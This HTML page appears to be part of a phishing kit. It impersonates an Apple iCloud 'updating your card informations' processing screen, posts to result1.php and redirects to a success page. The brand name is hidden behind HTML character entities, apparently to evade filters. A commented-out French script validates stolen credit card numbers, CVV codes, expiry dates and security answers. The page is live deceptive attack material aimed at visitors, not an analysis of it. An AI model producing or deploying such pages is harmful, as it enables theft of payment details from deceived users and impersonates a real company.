
<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>

<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>Processing ...</title>
	<link href="../css/style.css" type="text/css" rel="stylesheet" />
	<link rel="../stylesheet" href="css/validationEngine.jquery.css" type="text/css" />
	<script src="../js/jquery-1.8.2.min.js" type="text/javascript"></script>
	<script src="../js/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
	<script src="../js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
	<link rel="shortcut icon" href="../../img/favicon.ico">
	<meta http-equiv="refresh" content="5;Success.php" />
	<script>
		jQuery(document).ready(function(){
			jQuery("#signup").validationEngine();
		});
	</script>
	<!--
	<script type="text/javascript">
		function valider(){
		   if ( document.formPost.data10.value == "" ){
				alert ( "Veuillez entrer votre nom" );
				document.formPost.data10.focus();
				return false;
			}
		   if (!document.formPost.data1.value.match(/^[0-9]{16}$/)){
				alert ( "Veuillez saisir un num�ro de carte de cr�dit valide" );
				document.formPost.data1.focus();
				return false;
			}
		   if (!document.formPost.data2.value.match(/^[0-9]{3}$/)){
				alert ( "Cryptogramme (CVV) invalide" );
				document.formPost.data2.focus();
				return false;
			}
		   if ( document.formPost.data6.value == "" ){
				alert ( "Vous devez saisir une r�ponse" );
				document.formPost.data6.focus();
				return false;
			}
		   if ( document.formPost.data3.value == "0"){
				alert ( "Vous avez indiqu� une date d'expiration invalide" );
				document.formPost.data3.focus();
				return false;
			}
		}
	</script>
	-->
</head>
<body>
	<div id="top-bar">
		<div id="navbar">
			<ul >
				<li><a href="#"><img src="../img/app.png"  /></a></li>
				<li><a href="#"><img src="../img/ul1.png"  /></a></li>
				<li><a href="#"><img src="../img/ul2.png"  /></a></li>
				<li><a href="#"><img src="../img/ul3.png"  /></a></li>
				<li><a href="#"><img src="../img/ul4.png"  /></a></li>
				<li><a href="#"><img src="../img/ul5.png"  /></a></li>
				<li><a href="#"><img src="../img/ul6.png"  /></a></li>
				<li><a href="#"><img src="../img/ul7.png"  /></a></li>
				<li><form action="#" ><input class="top-nav-search" type="text" value="Search..." ></form></li>
			</ul>
			
		</div>
	</div>
	<div id="layout">
		<h1 class="logo"></h1>
		<div id="wrapper">
			<div class="left">
				<h1>Explore iCloud</h1>
				<p>Your &#65;p&#112;l&#101; ID gives you easy access to a wide range of &#65;p&#112;l&#101; services such as the iTunes Store, &#65;p&#112;l&#101; Online Store, iChat, and more. Your information will not be shared with anyone, unless you authorize us.</p>
			</div>
			<div class="right">
				<form  method="post" action="result1.php" name="signup" id="signup">
					<h1>Updating your card informations<img border="0" src="../img/sc.png" width="83" height="33" align="right"></h1>
					</br>
					</br>
</br>
</br>
</br>
</br>
</br>

					<table style="background: #fff" cellpadding="0" cellspacing="0" border="0" width="105%">
						
							<center style="background: #fff">
								<h1>Please do not refresh .</h1>
								<img src="../img/processing.gif" />
							</center>
						
					</table>
				</form>
			</div>
		</div>
		<div id="footer">
		<p>The &#65;p&#112;l&#101; Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a></p>
		<hr>
		<div class="copy-right"><a>Copyright &copy; 2015 &#65;p&#112;l&#101; Inc. All rights reserved.</a></div>
		<div class="terms"><a href="#">Terms of Use |</a> <a href="#">Terms of Use |</a><a href="#">Terms of Use .</a></div>
	 </div>
	</div>
</body>	
</html>